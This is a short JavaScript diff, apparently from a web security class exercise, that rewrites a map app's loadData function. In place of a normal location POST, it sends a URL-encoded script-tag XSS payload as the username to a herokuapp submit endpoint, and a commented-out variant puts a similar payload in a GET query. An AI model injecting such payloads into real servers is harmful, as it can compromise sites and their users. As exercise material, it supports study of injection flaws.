@@ -112,21 +112,31 @@
                 }
                 // Call database API to load data, and send data back to callback function
                 function loadData(callback){
-                    var request = new XMLHttpRequest();
-                    // var myurl = "https://defense-in-derpth.herokuapp.com/submit";
-                    var myurl = "https://afternoon-bastion-67239.herokuapp.com/submit";
-                    var params = "username=" + myusername + "&lat=" + myLat + "&lng=" + myLng;
+                    // var request = new XMLHttpRequest();
+                    // // var myurl = "https://defense-in-derpth.herokuapp.com/submit";
+                    // var hack = "%3Cscript%3Ealert%28%22Hacked%22%29%3C%2Fscript%3E";
+                    // var myurl = "https://afternoon-bastion-67239.herokuapp.com/vehicle.json?username=" + hack;
+                    
+                    // // var params = "username=JANET" + "&lat=" + myLat + "&lng=" + myLng;
 
-                    request.onreadystatechange=function(){
-                        if (request.readyState==4 && request.status==200){
-                            if(typeof callback === 'function' )
-                                callback(request.responseText);
+                    // request.onload=function(){
+                    //     if (request.readyState==4 && request.status==200){
+                    //         
+                    // }
+                    // request.open("GET", myurl, true);
+                    // request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                    // // console.log("sending params: " + params);
+                    // // request.send(params);
+
+                    var req = new XMLHttpRequest();
+                    req.onload=function(){
+                        if(req.readyState==4&&req.status==200){
+                            console.log("requested!");
                         }
                     }
-                    request.open("POST", myurl, true);
-                    request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-                    console.log("sending params: " + params);
-                    request.send(params);
+                    req.open("POST", "https://defense-in-derpth.herokuapp.com/submit", true);
+                    req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                    req.send("username=%3Cscript%3Ealert(%22Hack%20within%20a%20hack!%22)%3C%2Fscript%3E&lat=12&lng=24");
 
                 }
                 // Open info window on click of marker
